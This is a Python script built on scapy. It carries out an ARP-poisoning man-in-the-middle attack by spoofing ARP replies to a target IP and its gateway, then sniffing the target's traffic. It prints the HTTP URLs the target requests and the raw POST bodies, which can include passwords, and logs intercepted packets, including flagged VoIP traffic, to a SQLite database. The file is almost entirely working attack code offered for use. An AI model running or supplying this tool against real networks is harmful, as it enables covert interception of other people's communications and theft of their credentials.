from scapy.all import *
from scapy.layers.http import HTTPRequest
import sys
import os
import time
import sqlite3
import argparse

# TODO: check ip forwarding
# TODO: check ip format (for arguments)

conf.verb = 0  # set scapy's verbosity level to 0


class Mitm(object):
    """Mitm class to perform mitm attacks"""

    def __init__(self, targetIP, gateIP):
        super(Mitm, self).__init__()
        self.targetIP = targetIP
        self.targetMAC = self.getMacForIp(self.targetIP)
        self.gateIP = gateIP
        self.gateMAC = self.getMacForIp(self.gateIP)

    def getMacForIp(self, ip):
        """Get the mac address for the given ip address
           Send an ARP request over the network asking for the mac address of
           the given ip address
        """
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                         ARP(pdst=ip), timeout=2)
        if ans:
            for _, r in ans:
                return r.hwsrc
        else:
            raise Exception("Can't find mac address for " + str(ip))

    def poison(self):
        """Poison target and gate to allow mitm attack

        """
        if not self.gateMAC or not self.targetMAC:
            raise Exception(
                "Can't poison: gate's MAC address or target's MAC address is not defined.")
        send(ARP(op="who-has", pdst=self.targetIP,
                 psrc=self.gateIP, hwdst=self.targetMAC))
        send(ARP(op="who-has", pdst=self.gateIP,
                 psrc=self.targetIP, hwdst=self.gateMAC))
        # time.sleep(2)

    def exploit(self, func):
        """Exploit the target

        """
        print("Preparing asynchronic sniffer...")
        t = sniff(prn=lambda pkt: func(
            pkt, self.targetIP), filter="tcp", store=False)
        """t = AsyncSniffer(prn=lambda pkt: func(
            pkt, self.targetIP), filter="tcp", store=False)"""
        #t = AsyncSniffer(prn=GET_print, lfilter=lambda p: "GET" in str(p), filter="tcp port 80")
        #t = AsyncSniffer(prn=lambda pkt: pkt.summary(), filter="http")
        print("Sniffing...")
        t.start()
        while True:
            pass

    def restoreARP(self):
        """Reverse the poison attack

        """
        send(ARP(op=2, pdst=self.gateIP, psrc=self.targetIP,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.targetMAC), count=7)
        send(ARP(op=2, pdst=self.targetIP, psrc=self.gateIP,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateMAC), count=7)


def printHTTP(pkt, targetIP):
    """
    This function is executed whenever a packet is sniffed
    """
    if pkt.haslayer(HTTPRequest):
        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst
        if ip_src == targetIP:  # or ip_dst == targetIP:
            # if this packet is an HTTP Request
            # get the requested URL
            url = pkt[HTTPRequest].Host.decode(
            ) + pkt[HTTPRequest].Path.decode()
            # get the requester's IP Address
            ip = pkt[IP].src
            # get the request method
            method = pkt[HTTPRequest].Method.decode()
            print(f"\n[+] {ip} Requested {url} with {method}")
            if pkt.haslayer(Raw) and method == "POST":
                # if show_raw flag is enabled, has raw data, and the requested method is "POST"
                # then show raw
                print(f"\n[*] Some useful Raw data: {pkt[Raw].load}")


def recordPackets(pkt, targetIP):
    print('--------------')
    if IP in pkt:
        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst
        print(ip_src == targetIP or ip_dst == targetIP)
        if ip_src == targetIP or ip_dst == targetIP:
            # if ip_src == targetIP:
            print("new intercepted packet : ")
            print(ip_src, " ==> ", ip_dst)
            print(pkt.summary())
            if pkt.haslayer(RTP):
                print("VOIP communication intercepted")
            # print(pkt.show())  # .summary()
            conn = sqlite3.connect('packets_log.db')
            c = conn.cursor()
            # pkt.layers[0] = data link
            if len(pkt.layers()) < 3:
                return  # TODO: a voir
            layer_name = pkt.layers()[2]._name  # transport layer protocol
            try:
                c.execute(
                    "INSERT INTO communication(date_com, protocole, ip_src, ip_dst, port, content, additional_data) VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (pkt.time, layer_name, pkt.src, pkt.dst, pkt.dport, hexdump(pkt), pkt.lastlayer().name))
            except:
                c.execute(
                    "INSERT INTO communication(date_com, protocole, ip_src, ip_dst, content, additional_data) VALUES (?, ?, ?, ?, ?, ?)",
                    (pkt.time, layer_name, pkt.src, pkt.dst, hexdump(pkt), pkt.lastlayer().name))
                # Saving data into database
            conn.commit()


def main():
    # arguments processing part
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "targetIP", help="IP address of the targetted system", type=str)
    parser.add_argument(
        "gateIP", help="gate's IP address used by the target", type=str)
    args = parser.parse_args()
    # mitm part
    mitm = None
    try:
        print("Initializing mitm agent...\n")
        print(get_windows_if_list())
        print(get_if_list())
        mitm = Mitm(args.targetIP, args.gateIP)
        print("Target's MAC address : ", mitm.targetMAC)
        print("Gate's MAC address : ", mitm.gateMAC)
        print("\nPoisoning target...")
        mitm.poison()
        print("\nExploiting target...")
        mitm.exploit(printHTTP)
    except KeyboardInterrupt:
        print("SIGINT received...")
        if mitm:
            print("Restoring target's arp...")
            mitm.restoreARP()
    except Exception as e:
        print("Error : " + str(e))
    finally:
        if mitm:
            mitm.restoreARP()
        print("Exiting...")
        sys.exit(1)

if __name__ == '__main__':
    main()
